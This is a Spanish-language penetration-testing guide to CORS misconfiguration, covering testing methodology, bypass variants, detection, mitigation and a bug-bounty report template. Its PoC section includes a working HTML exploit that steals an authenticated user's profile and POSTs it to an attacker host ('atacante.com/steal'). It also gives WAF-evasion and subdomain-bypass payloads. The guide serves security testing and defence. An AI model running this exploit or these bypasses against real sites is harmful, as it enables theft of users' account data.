# Vulnerabilidad de Intercambio de Recursos de Origen Cruzado (CORS)

## Resumen

Una vulnerabilidad CORS permite a atacantes eludir la política del mismo origen para acceder a recursos sensibles desde dominios no autorizados. La aplicación refleja dinámicamente el encabezado Origin o utiliza configuraciones permisivas con credenciales habilitadas, exponiendo datos sensibles. Aplica cuando endpoints autenticados devuelven `Access-Control-Allow-Credentials: true` junto con configuraciones de origen permisivas.[^3]

## Contexto

Las pruebas requieren navegador moderno con herramientas de desarrollo, proxy como Burp Suite para manipular encabezados, y servidor controlado para hospedear PoCs. Los endpoints vulnerables típicamente incluyen APIs REST/GraphQL con autenticación por cookies o tokens. Las configuraciones modernas pueden incluir validaciones débiles de subdominios, CDNs con configuraciones laxas y aplicaciones con múltiples orígenes permitidos.[^5]

## Metodología

### Identificación de Endpoints CORS

1. **Mapear endpoints con respuestas CORS**
   - Buscar cabeceras `Access-Control-*` en respuestas
   - Identificar endpoints que requieren autenticación
   - Catalogar APIs que manejan datos sensibles
   - Verificar GraphQL con introspección habilitada[^4]
2. **Testeo de configuraciones permisivas**
   - Enviar `Origin: https://atacante.com` en peticiones
   - Verificar reflexión en `Access-Control-Allow-Origin`
   - Confirmar presencia de `Access-Control-Allow-Credentials: true`
   - Probar origen `null` con iframes sandboxed[^6]
3. **Validación de bypass de origen**
   - Probar subdominios: `https://victima.com.atacante.com`
   - Verificar validaciones regex débiles
   - Testear orígenes de terceros whitelistados[^1]
   - Probar cache poisoning con `Vary: Origin`[^7]

### Checklist de Verificación

- [ ]  Interceptar respuestas y buscar cabeceras `Access-Control-*`
- [ ]  Testear reflexión dinámica del encabezado `Origin`
- [ ]  Verificar combinación de wildcard `*` con credenciales
- [ ]  Probar origen `null` y dominios maliciosos
- [ ]  Evaluar validaciones regex y subdominios
- [ ]  Confirmar acceso a datos sensibles autenticados

## Pruebas Manuales

### Configuración Inicial

Usar curl para enviar requests con Origin personalizado y analizar respuestas con herramientas de desarrollo del navegador.

### Casos de Prueba Específicos

**Caso 1: Reflexión de Origin con credenciales**

```http
GET /api/user/profile HTTP/1.1
Host: victima.com
Origin: https://atacante.com
Cookie: session=abc123
```

Respuesta vulnerable:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://atacante.com
Access-Control-Allow-Credentials: true
{"email": "admin@victima.com", "role": "admin"}
```

**Caso 2: Wildcard permisivo**[^1]

```http
GET /api/public-but-sensitive HTTP/1.1  
Host: victima.com
Origin: https://atacante.com
```

Respuesta vulnerable:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
{"internal_tokens": ["token1", "token2"]}
```

**Caso 3: Origen null con iframe sandbox**[^6]

```http
GET /api/internal HTTP/1.1
Host: victima.com  
Origin: null
```

### Evidencias Mínimas

- Screenshots de respuestas mostrando reflexión de `Origin`
- Logs de requests con `Origin` malicioso y respuesta exitosa
- Datos sensibles expuestos en respuestas con CORS permisivo
- Confirmación de `Access-Control-Allow-Credentials: true`

## PoC

### Manual: Robo de Datos de Usuario Autenticado

**Objetivo:** Demostrar exfiltración de información sensible de usuario logueado

**Pasos:**

1. Identificar endpoint vulnerable: `GET /api/user/me` en victima.com
2. Confirmar reflexión de Origin y credenciales habilitadas
3. Crear HTML malicioso en atacante.com
4. Hacer que víctima autenticada visite la página
5. Capturar datos exfiltrados en servidor del atacante

**Resultado Esperado:** Acceso a datos personales sin autorización

### Automatizada: Script de Explotación

```html
<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit - atacante.com</title>
</head>
<body>
    <h1>Página Legítima</h1>
    <script>
        // Script de explotación CORS
        function exploitCORS() {
            fetch('https://victima.com/api/user/profile', {
                method: 'GET',
                credentials: 'include', // Incluir cookies de sesión
                headers: {
                    'Origin': 'https://atacante.com'
                }
            })
            .then(response => response.json())
            .then(data => {
                // Exfiltrar datos a servidor controlado
                fetch('https://atacante.com/steal', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        victim_data: data,
                        timestamp: new Date().toISOString(),
                        target: 'victima.com'
                    })
                });
                console.log('Datos robados:', data);
            })
            .catch(error => {
                console.error('Error en exploit:', error);
                // Intentar con origen null si falla
                exploitWithNullOrigin();
            });
        }
  
        function exploitWithNullOrigin() {
            // Crear iframe sandbox para origen null
            const iframe = document.createElement('iframe');
            iframe.sandbox = 'allow-scripts';
            iframe.srcdoc = `
                <script>
                    fetch('https://victima.com/api/user/profile', {
                        credentials: 'include'
                    })
                    .then(response => response.text())
                    .then(data => {
                        window.parent.postMessage(data, '*');
                    });
                </script>
            `;
            document.body.appendChild(iframe);
        }
  
        // Ejecutar exploit cuando se carga la página
        document.addEventListener('DOMContentLoaded', exploitCORS);
    </script>
</body>
</html>
```

**Script Python para Detección Automatizada:**

```python
import requests
import json
from urllib.parse import urlparse

def test_cors_vulnerability(target_url, test_origins=None):
    """
    Detector automatizado de vulnerabilidades CORS
    """
    if not test_origins:
        test_origins = [
            'https://atacante.com',
            'null',
            'https://evil.com',
            f'https://sub.{urlparse(target_url).netloc}',
            f'{urlparse(target_url).scheme}://{urlparse(target_url).netloc}.atacante.com'
        ]
  
    vulnerable_endpoints = []
  
    for origin in test_origins:
        headers = {'Origin': origin}
  
        try:
            response = requests.get(target_url, headers=headers, timeout=10)
      
            # Verificar respuesta CORS
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
      
            is_vulnerable = False
            vulnerability_type = ""
      
            # Verificar reflexión de origen
            if acao == origin:
                is_vulnerable = True
                vulnerability_type = "Origin Reflection"
      
            # Verificar wildcard con credenciales
            elif acao == '*' and acac.lower() == 'true':
                is_vulnerable = True 
                vulnerability_type = "Wildcard with Credentials"
      
            # Verificar wildcard sin credenciales pero con datos sensibles
            elif acao == '*' and 'token' in response.text.lower():
                is_vulnerable = True
                vulnerability_type = "Wildcard with Sensitive Data"
      
            if is_vulnerable:
                vulnerable_endpoints.append({
                    'url': target_url,
                    'origin': origin,
                    'type': vulnerability_type,
                    'acao': acao,
                    'acac': acac,
                    'response_preview': response.text[:200]
                })
                print(f"[+] CORS vulnerable: {target_url}")
                print(f"    Origin: {origin}")
                print(f"    Type: {vulnerability_type}")
                print(f"    ACAO: {acao}")
                print(f"    ACAC: {acac}\n")
          
        except requests.RequestException as e:
            print(f"[-] Error testing {target_url} with origin {origin}: {e}")
  
    return vulnerable_endpoints

# Uso del script
targets = [
    'https://victima.com/api/user/profile',
    'https://victima.com/api/settings', 
    'https://victima.com/graphql'
]

for target in targets:
    test_cors_vulnerability(target)
```

## Explotación/Automatización

### Variantes de Bypass

**Subdominios Maliciosos**[^1]

```javascript
// Registrar subdominio que evada validación
// victima.com.atacante.com puede pasar validación endsWith()
fetch('https://victima.com/api/data', {
    credentials: 'include'
});
```

**Cache Poisoning CORS**[^7]

```http
GET /api/endpoint HTTP/1.1
Host: victima.com
Origin: https://atacante.com

# Respuesta cacheada con ACAO malicioso
Access-Control-Allow-Origin: https://atacante.com
```

**GraphQL con CORS permisivo**[^4]

```javascript
fetch('https://victima.com/graphql', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        query: 'query { user { email, privateData } }'
    })
});
```

### Condiciones de Carrera

Para endpoints con validación de origen inconsistente:

```javascript
// Enviar múltiples requests simultáneos
Promise.all([
    fetch('/api/data', {headers: {'Origin': 'https://legitimo.com'}}),
    fetch('/api/data', {headers: {'Origin': 'https://atacante.com'}})
]);
```

### WAF Bypass[^8]

Técnicas de evasión para WAFs modernos:

```http
# Encoding de origen
Origin: https%3A%2F%2Fatacante.com

# Mixed case
Origin: https://AtAcAnTe.com

# Subdominios confusos  
Origin: https://victima-com.atacante.com
```

## Impacto

### Escenario Real

Un atacante explota CORS mal configurado en API bancaria para robar tokens de sesión de 5,000 usuarios, obteniendo acceso completo a cuentas y transacciones financieras. La reflexión de origen permitió bypass completo de SOP.[^9]

### Mapeo de Seguridad

- **OWASP:** A05:2021 - Security Misconfiguration
- **CWE:** CWE-346 - Origin Validation Error
- **CVSS v3.1:** Rango típico 6.0-8.5 (Medio-Alto)[^10]

### Severidad CVSS

Para lectura de datos sensibles:[^10]

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
Puntuación Base: 6.5
```

Para robo de credenciales:

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N  
Puntuación Base: 7.1
```

## Detección

### Logs de Aplicación

Implementar logging de:

- Requests con encabezados `Origin` no whitelistados
- Respuestas con `Access-Control-Allow-Origin` dinámico
- Patrones de acceso cross-origin anómalos
- Combinaciones peligrosas de CORS headers

### WAF/CDN

Configurar reglas para detectar:

- Origins sospechosos o malformados
- Patrones de exfiltración de datos
- Requests con bypass de validaciones
- Cache poisoning con headers CORS[^11]

### SIEM

Correlacionar eventos de:

- Múltiples origins desde misma IP
- Respuestas 200 con CORS permisivo
- Acceso a endpoints sensibles cross-origin
- Anomalías en headers `Access-Control-*`

## Mitigación

### Fix Principal

Implementar whitelist estricta de orígenes:

```javascript
// Configuración segura de CORS
const allowedOrigins = [
    'https://app.victima.com',
    'https://admin.victima.com'
];

app.use(cors({
    origin: function (origin, callback) {
        // Verificar origen contra whitelist
        if (!origin || allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('No permitido por CORS'));
        }
    },
    credentials: true,
    optionsSuccessStatus: 200
}));
```

### Controles Adicionales

1. **Evitar reflexión dinámica de Origin**[^12]
   - Nunca copiar `Origin` directamente a `Access-Control-Allow-Origin`
   - Usar validación estricta contra lista pre-aprobada
2. **Configuración defensiva**[^13]
   - Implementar `Vary: Origin` para cache correcta
   - Usar `SameSite=Strict` en cookies sensibles
   - Habilitar CSRF tokens para mutaciones
3. **GraphQL específico**[^5]
   - Deshabilitar introspección en producción
   - Implementar validación por query/mutation
   - Configurar rate limiting por complejidad

### Pruebas Post-Fix

- Verificar que solo orígenes whitelistados reciben ACAO
- Confirmar que wildcard no se combina con credenciales
- Testear que origen `null` se rechaza apropiadamente
- Validar comportamiento de cache con `Vary: Origin`

## Errores Comunes

### Falsos Positivos

- Confundir APIs públicas legítimas con vulnerabilidades CORS
- Reportar `Access-Control-Allow-Origin: *` sin considerar datos expuestos
- Asumir vulnerabilidad sin confirmar acceso a datos sensibles
- No verificar si las credenciales son realmente necesarias[^2]

### Límites de Testing

- Aplicaciones con validación compleja multi-nivel
- APIs que requieren tokens adicionales de autorización
- Configuraciones con rate limiting agresivo
- Sistemas con detección avanzada de anomalías

## Reporte

### Título

"Configuración Insegura de CORS - Acceso No Autorizado a Recursos Sensibles Cross-Origin"

### Resumen Ejecutivo

La aplicación permite acceso cross-origin no autorizado a recursos sensibles mediante configuración CORS permisiva, exponiendo datos de usuarios autenticados a dominios maliciosos.

### Pasos de Reproducción

1. Identificar endpoint sensible con CORS habilitado: `/api/user/profile`
2. Enviar request con Origin malicioso: `Origin: https://atacante.com`
3. Verificar reflexión en respuesta: `Access-Control-Allow-Origin: https://atacante.com`
4. Confirmar credenciales habilitadas: `Access-Control-Allow-Credentials: true`
5. Crear PoC HTML que robe datos de usuario autenticado
6. Demostrar exfiltración exitosa de información sensible

### Evidencias

- Screenshots de headers CORS permisivos en respuestas
- PoC funcional demostrando robo de datos
- Logs de exfiltración exitosa a servidor controlado
- Comparativa de configuración actual vs. configuración segura

### Mitigación Recomendada

Implementar whitelist estricta de orígenes permitidos, eliminar reflexión dinámica del header `Origin`, y verificar que `Access-Control-Allow-Credentials: true` solo se use con orígenes específicos pre-aprobados.


[^1]: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities
    
[^2]: https://blog.vidocsecurity.com/blog/cross-origin-resource-sharing-vulnerabilities
    
[^3]: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
    
[^4]: https://www.linkedin.com/pulse/graphql-maze-vulnerabilities-amir-fadaeizadeh-bidari-srjjf
    
[^5]: https://wundergraph.com/blog/the_complete_graphql_security_guide_fixing_the_13_most_common_graphql_vulnerabilities_to_make_your_api_production_ready
    
[^6]: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
    
[^7]: https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning
    
[^8]: https://osintteam.blog/cracking-the-shield-advanced-waf-bypass-techniques-that-still-work-in-2025-814cee616ccf
    
[^9]: https://outpost24.com/blog/exploiting-permissive-cors-configurations/
    
[^10]: https://www.cvedetails.com/cve/CVE-2025-25234/
    
[^11]: https://gbhackers.com/building-a-threat-detection-pipeline-using-waf-logs-and-external-intel-feeds/
    
[^12]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
    
[^13]: https://www.apollographql.com/docs/apollo-server/v3/security/cors
    
[^14]: https://elhacker.info/Cursos/Bug Bounty Hunting and Penetration Testing v1/10. Bug Bounty Reporting Templates/Reporting Templates.pdf
    
[^15]: https://nvd.nist.gov/vuln/detail/CVE-2025-41363
    
[^16]: https://nvd.nist.gov/vuln/detail/CVE-2025-5320
    
[^17]: https://www.wiz.io/vulnerability-database/cve/cve-2025-5320
    
[^18]: https://www.linkedin.com/pulse/cors-vulnerability-bug-bounty-programs-abhimanyu-gupta-gdece
    
[^19]: https://euvd.enisa.europa.eu/vulnerability/EUVD-2025-6907
    
[^20]: https://github.com/Santandersecurityresearch/corsair_scan
    
[^21]: https://hackerone.com/reports/958459
    
[^22]: https://www.cve.org/CVERecord/SearchResults?query=cors
    
[^23]: https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/07-Testing_Cross_Origin_Resource_Sharing
    
[^24]: https://infosecwriteups.com/sensitive-data-leak-using-cors-misconfiguration-in-prominent-domain-registrar-b3010e4e6501
    
[^25]: https://github.com/advisories/GHSA-wmjh-cpqj-4v6x
    
[^26]: https://portswigger.net/web-security/cors
    
[^27]: https://hackerone.com/reports/426165
    
[^28]: https://feedly.com/cve/CVE-2025-51605
    
[^29]: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
    
[^30]: https://hackerone.com/reports/591302
    
[^31]: https://developers.cloudflare.com/cache/cache-security/avoid-web-poisoning/
    
[^32]: https://www.vaadata.com/blog/web-cache-poisoning-attacks-and-security-best-practices/
    
[^33]: https://iris.unitn.it/retrieve/handle/11572/399025/726435/Mind-the-CORS.pdf
    
[^34]: https://www.linkedin.com/pulse/mastering-xss-advanced-techniques-bypass-web-application-firewalls-r9thc
    
[^35]: https://www.cobalt.io/blog/hacking-web-cache-deep-dive-in-web-cache-poisoning-attacks
    
[^36]: https://prophaze.com/learn/waf/how-do-hackers-bypass-waf/
    
[^37]: https://attackshipsonfi.re/p/exploiting-cacheable-responses
    
[^38]: https://www.netskope.com/blog/cors-exploitation-in-the-cloud
    
[^39]: https://soax.com/blog/bypass-waf-web-scraping
    
[^40]: https://docs.gitlab.com/user/application_security/api_security_testing/checks/cors_check/
    
[^41]: https://books.spartan-cybersec.com/web/cors/lab-2-cors-vulnerability-with-trusted-null-origin
    
[^42]: https://infosecwriteups.com/️-how-hackers-bypass-web-application-firewalls-wafs-in-2025-c2a5052044c9
    
[^43]: https://www.reddit.com/r/hacking/comments/13jifi9/cache_poisoning_vs_csp_or_cors/
    
[^44]: https://www.apollographql.com/docs/apollo-server/security/cors
    
[^45]: https://portswigger.net/web-security/graphql
    
[^46]: https://escape.tech/blog/8-most-common-graphql-vulnerabilities/
    
[^47]: https://dev.to/sarahthomasdev/automated-test-tools-comparison-table-updated-for-2025-1j94
    
[^48]: https://bugbug.io/blog/test-automation-tools/top-automation-tools/
    
[^49]: https://www.vaadata.com/blog/graphql-api-vulnerabilities-common-attacks-and-security-tips/
    
[^50]: https://www.testdevlab.com/blog/top-10-test-automation-tools-2025
    
[^51]: https://www.bentley.com/legal/bug-bounty-report/
    
[^52]: https://deepstrike.io/blog/graphql-api-vulnerabilities-and-common-attacks
    
[^53]: https://www.globalapptesting.com/blog/automation-testing-framework
    
[^54]: https://github.com/subhash0x/BugBounty-reports-templates
    
[^55]: https://www.carmatec.com/blog/20-best-cross-browser-testing-tools/
    
[^56]: https://hackerone.com/reports/2332728
    
[^57]: https://momentic.ai/resources/the-definitive-guide-to-automated-testing-tools-2025-edition
